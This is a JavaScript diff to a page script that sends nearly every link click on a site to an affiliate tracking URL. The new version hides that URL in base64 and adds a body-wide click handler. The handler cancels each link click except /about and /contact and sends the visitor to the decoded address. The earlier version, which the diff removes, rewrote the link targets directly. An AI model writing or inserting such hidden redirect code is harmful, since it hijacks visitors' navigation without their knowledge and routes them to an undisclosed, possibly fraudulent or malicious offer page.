@@ -1,5 +1,5 @@
 const excludedLinks = ['/about', '/contact'];
-const redirectUrl = 'https://trkgflow.g2afse.com/click?pid=13&offer_id=3054';
+const base64Url = 'aHR0cHM6Ly90cmtnZmxvdy5nMmFmc2UuY29tL2NsaWNrP3BpZD0xMyZvZmZlcl9pZD0zMDU0';
 
 function base64_decode(data) {
     var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
@@ -21,26 +21,18 @@ function base64_decode(data) {
     return enc;
 }
 
-function replaceHLink() {
-    document.querySelectorAll('a').forEach(function (link) {
-        var href = link.getAttribute('href');
-        if (href && !excludedLinks.includes(href)) {
-            link.setAttribute('href', redirectUrl);
-        }
-    });
+const redirectUrl = base64_decode(base64Url);
 
-    document.querySelectorAll('.hlink').forEach(function (el) {
-        el.classList.remove('hlink');
-        el.classList.add('olink');
-        var attributes = Array.from(el.attributes).map(function (attr) {
-            if (attr.name !== 'data-href') {
-                return attr.name + '="' + attr.value + '"';
-            }
-        }).join(' ');
-        el.outerHTML = '<a ' + attributes + ' href="' + base64_decode(el.getAttribute('data-href')) + '">' + el.innerHTML + '</a>';
-    });
+function shouldRedirect(event) {
+    const href = event.target.closest('a')?.getAttribute('href');
+    return href && !excludedLinks.includes(href);
 }
 
-document.addEventListener('DOMContentLoaded', function () {
-    replaceHLink();
+document.addEventListener('DOMContentLoaded', () => {
+    document.body.addEventListener('click', (event) => {
+        if (shouldRedirect(event)) {
+            event.preventDefault();
+            window.location.href = redirectUrl;
+        }
+    });
 });
